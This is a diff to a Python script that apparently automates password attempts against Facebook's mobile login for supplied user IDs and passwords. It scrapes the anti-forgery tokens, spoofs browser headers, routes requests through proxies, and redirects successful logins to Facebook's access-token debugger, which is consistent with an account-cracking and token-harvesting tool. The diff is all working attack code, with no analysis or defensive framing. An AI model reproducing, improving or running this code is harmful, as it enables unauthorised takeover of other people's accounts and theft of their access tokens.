@@ -1346,12 +1346,12 @@ def mobile_v2(uiz,pwr,link_okep):
 				"sec-fetch-user": "?1",
 				"upgrade-insecure-requests": "1",
 				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-			p = ses.get(f"https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",headers=headers1)
+			p = ses.get(f"https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F&refsrc=deprecated&_rdr",headers=headers1)
 			data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
 				"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
 				"uid":uiz,
-				"next":f"https://{link_okep}/v7.0/dialog/oauth?display=popup&response_type=code&client_id=658686778541171&redirect_uri=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook&state=b9eb820b25d1c50ab896f860145238df&scope=public_profile%2Cemail&ret=login&fbapp_pres=0&logger_id=d214f965-77da-4e9e-8bff-793207c95801&tp=unspecified_rdr",
+				"next":f"https://developers.facebook.com/tools/debug/accesstoken/",
 				"pass":pw,
 				"flow":"login_no_pin"}
 			kuko = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
@@ -1375,7 +1375,7 @@ def mobile_v2(uiz,pwr,link_okep):
 				"sec-fetch-dest": "empty",
 				"sec-fetch-user": "?1",
 				"upgrade-insecure-requests": "1",
-				"referer": f"https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
+				"referer": f"https://{link_okep}/login/device-based/password/?uid={uiz}&flow=login_no_pin&next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F&refsrc=deprecated&_rdr",
 				"accept-encoding": "gzip, deflate br",
 				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 			po = ses.post(f"https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers2, cookies={"cookie": kuko}, proxies=proxs, allow_redirects=False)
